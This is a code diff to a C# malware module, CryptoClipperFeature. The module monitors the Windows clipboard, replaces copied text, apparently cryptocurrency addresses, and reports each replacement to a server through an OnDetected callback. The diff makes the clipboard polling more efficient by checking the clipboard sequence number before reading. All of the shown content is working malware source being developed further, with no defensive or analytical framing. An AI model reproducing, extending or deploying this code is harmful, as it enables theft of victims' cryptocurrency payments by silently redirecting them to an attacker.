@@ -12,6 +12,7 @@ internal static class CryptoClipperFeature
     [DllImport("user32.dll")]  private static extern bool EmptyClipboard();
     [DllImport("user32.dll")]  private static extern nint GetClipboardData(uint uFormat);
     [DllImport("user32.dll")]  private static extern nint SetClipboardData(uint uFormat, nint hMem);
+    [DllImport("user32.dll")]  private static extern uint GetClipboardSequenceNumber();
     [DllImport("kernel32.dll")] private static extern nint GlobalAlloc(uint uFlags, nuint dwBytes);
     [DllImport("kernel32.dll")] private static extern nint GlobalLock(nint hMem);
     [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(nint hMem);
@@ -55,6 +56,7 @@ internal static class CryptoClipperFeature
     private static string           _lastClip  = "";
     private static Thread?          _thread;
     private static volatile bool    _running;
+    private static uint             _lastSeqNum;
 
     // Callback to server when a replacement happens
     internal static Func<string, string, string, Task>? OnDetected; // (type, original, replaced)
@@ -99,11 +101,17 @@ internal static class CryptoClipperFeature
             {
                 if (_enabled)
                 {
-                    string? text = ReadClipboard();
-                    if (text != null && text != _lastClip && text.Length >= 20)
+                    // O(1) check — only read clipboard when Windows reports a change
+                    uint seq = GetClipboardSequenceNumber();
+                    if (seq != _lastSeqNum)
                     {
-                        _lastClip = text;
-                        CheckAndReplace(text);
+                        _lastSeqNum = seq;
+                        string? text = ReadClipboard();
+                        if (text != null && text != _lastClip && text.Length >= 20)
+                        {
+                            _lastClip = text;
+                            CheckAndReplace(text);
+                        }
                     }
                 }
             }
